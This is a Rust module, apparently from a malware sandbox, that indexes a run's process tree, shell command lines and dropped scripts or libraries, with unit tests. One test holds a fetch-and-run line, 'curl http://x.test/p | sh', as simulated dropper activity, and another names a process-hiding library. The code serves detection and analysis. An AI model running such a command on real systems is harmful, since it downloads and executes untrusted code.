// SPDX-License-Identifier: GPL-3.0-only
//! The lineage index of a run: which programs started which, and which files
//! the run wrote, from the process tree and the IOC file list the scan built.
//! It is kept in the run's Triage digest, so the sample window's lineage graph
//! can merge many runs without reading their recordings.
//!
//! The recording keeps no bytes of a file, so what counts as lineage is
//! decided by what the run did with the file and by its path: the sample, a
//! program that was run, and a written file that is a script or a shared
//! object, or sits where droppers stage things. Written configuration files
//! (crontabs, `ld.so.preload`) stay in the IOC list.
use super::*;
use antinomie_monitor_core::{
    ioc::indicator::Type,
    run_digest::{Lineage, LineageExec, LineageFile},
};
use std::collections::BTreeMap;

/// Shells and interpreters whose `-c` argument is a command line.
const LAUNCHERS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ash", "ksh", "python", "python2", "python3", "perl", "ruby",
    "node",
];
/// A command line longer than this is cut.
const COMMAND_LIMIT: usize = 512;

fn base(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// The image path a process ran, if the recording saw an absolute one.
fn image(node: &ProcessNode) -> Option<&str> {
    node.exec_history
        .iter()
        .map(String::as_str)
        .find(|path| path.starts_with('/'))
}

/// The command line of `argv` when it is a launcher run with `-c`.
fn command(argv: &[String]) -> Option<String> {
    let program = base(argv.first()?);
    let name = program.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if !LAUNCHERS
        .iter()
        .any(|launcher| *launcher == program || *launcher == name)
    {
        return None;
    }
    let at = argv.iter().position(|arg| arg == "-c")?;
    let text = argv.get(at + 1)?.trim();
    (!text.is_empty()).then(|| text.chars().take(COMMAND_LIMIT).collect())
}

/// Whether a written file is lineage: a script, a shared object or a file in
/// a place droppers stage things, and not configuration.
fn kept_when_written(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let name = base(&lower);
    if lower.starts_with("/etc/")
        || name == "crontab"
        || name.ends_with(".conf")
        || name.ends_with(".cfg")
        || name.ends_with(".log")
        || name.ends_with(".service")
        || name == "ld.so.preload"
        || name == "authorized_keys"
    {
        return false;
    }
    name.ends_with(".sh")
        || name.ends_with(".py")
        || name.ends_with(".pl")
        || name.ends_with(".elf")
        || name.ends_with(".bin")
        || name.contains(".so")
        || ["/tmp/", "/var/tmp/", "/dev/shm/"]
            .iter()
            .any(|dir| lower.starts_with(dir))
}

/// Build the index.
pub(super) fn index(nodes: &[ProcessNode], ioc: Option<&ioc_scan::IocScan>) -> Lineage {
    let mut out = Lineage::default();
    // Hashes the run knows for a path, from the IOC file list.
    let mut hashes: BTreeMap<&str, &str> = BTreeMap::new();
    if let Some(ioc) = ioc {
        for indicator in ioc.indicators.iter().filter(|i| i.ty == Type::File) {
            if let Some(hash) = indicator.hashes.as_ref().filter(|h| !h.sha256.is_empty()) {
                hashes.insert(indicator.path.as_str(), hash.sha256.as_str());
            }
        }
    }
    let by_task: BTreeMap<(u32, u64), &ProcessNode> = nodes
        .iter()
        .map(|node| ((node.pid, node.cookie), node))
        .collect();
    let mut execs: BTreeMap<(String, String, String), LineageExec> = BTreeMap::new();
    let mut executed = std::collections::BTreeSet::new();
    for node in nodes {
        let Some(path) = image(node) else { continue };
        let parent = node
            .parent
            .and_then(|key| by_task.get(&(key.pid, key.cookie)))
            .and_then(|parent| image(parent))
            .unwrap_or("");
        let command = command(&node.argv).unwrap_or_default();
        executed.insert(path.to_owned());
        let entry = execs
            .entry((parent.to_owned(), path.to_owned(), command.clone()))
            .or_insert_with(|| LineageExec {
                parent: parent.to_owned(),
                path: path.to_owned(),
                sha256: hashes
                    .get(path)
                    .map(|hash| (*hash).to_owned())
                    .unwrap_or_default(),
                command,
                count: 0,
            });
        entry.count += 1;
    }
    out.execs = execs.into_values().collect();
    let Some(ioc) = ioc else { return out };
    for indicator in ioc.indicators.iter().filter(|i| i.ty == Type::File) {
        let roles: Vec<String> = indicator.roles.clone();
        let sample = roles.iter().any(|role| role == "sample");
        let ran = executed.contains(indicator.path.as_str())
            || roles.iter().any(|role| role == "executed");
        let written = roles.iter().any(|role| {
            matches!(
                role.as_str(),
                "created" | "written at close" | "changed" | "deleted"
            )
        });
        if !(sample || ran || (written && kept_when_written(&indicator.path))) {
            continue;
        }
        let writer = indicator
            .process
            .as_ref()
            .and_then(|process| {
                nodes
                    .iter()
                    .find(|node| node.cookie == process.cookie)
                    .and_then(image)
            })
            .unwrap_or("")
            .to_owned();
        out.files.push(LineageFile {
            path: indicator.path.clone(),
            sha256: indicator
                .hashes
                .as_ref()
                .map(|hash| hash.sha256.clone())
                .unwrap_or_default(),
            roles,
            writer,
        });
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn node(pid: u32, parent: Option<u32>, image: &str, argv: &[&str]) -> ProcessNode {
        ProcessNode {
            parent: parent.map(|pid| TaskKey {
                pid,
                cookie: u64::from(pid),
            }),
            call_id: None,
            depth: 0,
            pid,
            cookie: u64::from(pid),
            comm: base(image).into(),
            parent_missing: false,
            tid: pid,
            argv: argv.iter().map(|arg| (*arg).to_owned()).collect(),
            first_ns: None,
            last_ns: None,
            state: String::new(),
            exec_history: vec![image.into()],
        }
    }

    #[test]
    fn executions_name_the_image_that_started_them_and_command_lines() {
        let nodes = vec![
            node(10, None, "/tmp/install.sh", &[]),
            node(
                11,
                Some(10),
                "/bin/sh",
                &["sh", "-c", "curl http://x.test/p | sh"],
            ),
            node(12, Some(11), "/usr/bin/curl", &["curl", "http://x.test/p"]),
            node(13, Some(10), "/tmp/.x", &["/tmp/.x"]),
            node(14, Some(10), "/tmp/.x", &["/tmp/.x"]),
        ];
        let lineage = index(&nodes, None);
        let find = |path: &str| lineage.execs.iter().find(|e| e.path == path).unwrap();
        assert_eq!(find("/tmp/.x").parent, "/tmp/install.sh");
        assert_eq!(find("/tmp/.x").count, 2);
        assert_eq!(find("/bin/sh").command, "curl http://x.test/p | sh");
        assert_eq!(find("/usr/bin/curl").parent, "/bin/sh");
        assert_eq!(find("/tmp/install.sh").parent, "");
        assert!(lineage.files.is_empty());
    }

    #[test]
    fn only_scripts_libraries_and_staging_paths_are_kept_when_written() {
        assert!(kept_when_written("/tmp/.x"));
        assert!(kept_when_written("/usr/lib/libprocesshider.so"));
        assert!(kept_when_written("/home/user/run.sh"));
        assert!(!kept_when_written("/etc/ld.so.preload"));
        assert!(!kept_when_written("/var/spool/cron/crontabs/root"));
        assert!(!kept_when_written("/home/user/notes.txt"));
    }

    #[test]
    fn a_launcher_needs_dash_c_and_a_known_program() {
        let argv = |parts: &[&str]| parts.iter().map(|p| (*p).to_owned()).collect::<Vec<_>>();
        assert_eq!(
            command(&argv(&["python3", "-c", "print(1)"])).as_deref(),
            Some("print(1)")
        );
        assert_eq!(command(&argv(&["sh", "script.sh"])), None);
        assert_eq!(command(&argv(&["curl", "-c", "jar"])), None);
    }
}
